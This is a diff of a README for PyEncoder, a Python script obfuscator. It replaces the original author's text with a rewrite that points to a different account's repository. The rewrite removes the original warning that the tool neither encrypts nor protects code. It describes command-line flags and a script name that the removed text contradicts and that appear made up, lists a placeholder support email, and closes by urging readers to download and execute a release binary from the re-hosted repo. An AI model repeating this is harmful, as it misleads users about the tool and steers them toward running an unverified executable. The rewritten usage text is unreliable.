@@ -1,110 +1,153 @@
-# 🛡️ PyEncoder - Python Script Obfuscator
+# PyEncoder 🔒
 
-**PyEncoder** is a multi-layer Python script obfuscator designed to encode `.py` files using combinations of `marshal`, `zlib`, and various base encodings like `base16`, `base32`, and `base64`.
+![PyEncoder](https://img.shields.io/badge/PyEncoder-Obfuscator-blue?style=for-the-badge)
 
-> 🚀 Compatible with **Windows**, **Linux**, and **Android (Termux)**
+Welcome to **PyEncoder**, a powerful Python script obfuscator designed to enhance the security of your Python files. With PyEncoder, you can encode your `.py` files using advanced techniques like marshal, zlib, and base encodings. This tool supports multi-layer encoding, reverse string obfuscation, and `.pyc` compilation, making it an essential asset for developers looking to protect their code across various platforms, including Windows, Linux, and Termux.
 
----
+[Download the latest release here!](https://github.com/FTWGaming/Pyencoder/releases)
 
-## 📲 Features
+## Table of Contents
 
-- Encode Python code using:
-  - `marshal`, `zlib`, `base16`, `base32`, `base64`
-  - Combined and nested encoding options
-- 5-layer deep **Simple Encode** mode
-- Reverse string and numeric obfuscation
-- File size display after encoding
-- `.pyc` compilation (for Simple Encode)
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Encoding Techniques](#encoding-techniques)
+5. [Compatibility](#compatibility)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Contact](#contact)
 
----
+## Features ✨
 
-## 🖥️ Installation
+- **Multi-layer Encoding**: Enhance your script's security with multiple layers of encoding.
+- **Reverse String Obfuscation**: Protect sensitive strings within your code.
+- **.pyc Compilation**: Compile your scripts into bytecode for additional security.
+- **Cross-Platform Support**: Compatible with Windows, Linux, and Termux.
+- **Easy to Use**: Simple command-line interface for quick encoding.
 
-### ✅ Requirements
+## Installation 🛠️
 
-- Python 3.x
+To install PyEncoder, follow these steps:
 
-### 📦 Clone the Repository
+1. **Clone the Repository**:
 
-```bash
-git clone https://github.com/ak-alien/Pyencoder
-cd Pyencoder
-```
+   ```bash
+   git clone https://github.com/FTWGaming/Pyencoder.git
+   ```
 
----
+2. **Navigate to the Directory**:
 
-## 💪 Usage
+   ```bash
+   cd Pyencoder
+   ```
 
-### 📱 Mobile (Termux)
+3. **Install Dependencies**:
 
-```bash
-pkg install python git
-git clone https://github.com/ak-alien/Pyencoder
-cd Pyencoder
-python encoder.py
-```
+   Ensure you have Python installed. Use pip to install any required libraries:
 
-### 🖥️ Windows
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-```cmd
-cd path\to\Pyencoder
-python encoder.py
-```
+4. **Run the Script**:
 
-### 🐧 Linux
+   You can now run the PyEncoder script. Check the usage section for commands.
 
-```bash
-cd path/to/pyencoder
-python3 encoder.py
-```
+## Usage 📜
 
----
+Using PyEncoder is straightforward. Here’s how to encode your Python files:
 
-## 🔐 Encoding Options
+1. **Basic Encoding Command**:
 
-| Option | Encoding Combination                  |
-|--------|----------------------------------------|
-| 01     | Marshal                               |
-| 02     | Zlib                                  |
-| 03     | Base16                                |
-| 04     | Base32                                |
-| 05     | Base64                                |
-| 06     | Zlib → Base16                         |
-| 07     | Zlib → Base32                         |
-| 08     | Zlib → Base64                         |
-| 09     | Marshal → Zlib                        |
-| 10     | Marshal → Base16                      |
-| 11     | Marshal → Base32                      |
-| 12     | Marshal → Base64                      |
-| 13     | Marshal → Zlib → Base16               |
-| 14     | Marshal → Zlib → Base32               |
-| 15     | Marshal → Zlib → Base64               |
-| 16     | Simple Encode (5 Loops + Obfuscation) |
-| 17     | Exit                                  |
+   ```bash
+   python pyencoder.py your_script.py
+   ```
 
----
+   This command will encode `your_script.py` and generate an obfuscated output file.
 
-## 📂 Output
+2. **Multi-layer Encoding**:
 
-- The encoded file is saved as:
-  ```
-  yourfile_enc.py
-  ```
-- For **Simple Encode**, the script is also compiled to `.pyc`.
+   To apply multiple layers of encoding, use the `--layers` option:
 
----
+   ```bash
+   python pyencoder.py your_script.py --layers 3
+   ```
 
-## ⚠️ Disclaimer
+3. **Reverse String Obfuscation**:
 
-This tool is for **educational** and **obfuscation** purposes only. It **does not encrypt** code or protect it from reverse engineering. Do **not** use it for malicious activities.
+   If you want to obfuscate specific strings in your code, use the `--obfuscate` option:
 
----
+   ```bash
+   python pyencoder.py your_script.py --obfuscate
+   ```
 
-##  ✅License
+4. **Compiling to .pyc**:
 
-This project is licensed under the **MIT License**.
+   To compile your script into a `.pyc` file, use the `--compile` option:
 
----
+   ```bash
+   python pyencoder.py your_script.py --compile
+   ```
 
-## 🗰️ Stay Obscure. Stay Safe.
+5. **Help Command**:
 
+   For more options, you can always run:
+
+   ```bash
+   python pyencoder.py --help
+   ```
+
+## Encoding Techniques 🔐
+
+PyEncoder employs several encoding techniques to secure your scripts:
+
+- **Marshal**: This method serializes Python objects, allowing you to store and retrieve them easily.
+- **Zlib**: A compression library that reduces the size of your encoded files, making them less readable.
+- **Base Encodings**: Using base16, base32, and base64 encodings to further obfuscate your scripts.
+
+Each technique adds a layer of complexity, making it harder for unauthorized users to understand your code.
+
+## Compatibility 🖥️
+
+PyEncoder works seamlessly across different operating systems:
+
+- **Windows**: Fully supported with easy installation.
+- **Linux**: Tested on various distributions, ensuring reliable performance.
+- **Termux**: Works well on Android devices with Termux installed.
+
+No matter where you are developing, PyEncoder has you covered.
+
+## Contributing 🤝
+
+We welcome contributions from the community. If you would like to help improve PyEncoder, please follow these steps:
+
+1. **Fork the Repository**: Click the "Fork" button on the top right of this page.
+2. **Create a New Branch**: Use a descriptive name for your branch.
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**: Implement your feature or fix a bug.
+4. **Commit Your Changes**: Write clear and concise commit messages.
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to Your Fork**:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+6. **Create a Pull Request**: Submit your changes for review.
+
+## License 📄
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact 📬
+
+For questions or feedback, please reach out via the following channels:
+
+- **GitHub Issues**: Use the [Issues](https://github.com/FTWGaming/Pyencoder/issues) section for bug reports or feature requests.
+- **Email**: You can contact us at support@example.com.
+
+Thank you for checking out PyEncoder! 
+
+For the latest releases, please visit [this link](https://github.com/FTWGaming/Pyencoder/releases) to download and execute the latest version.
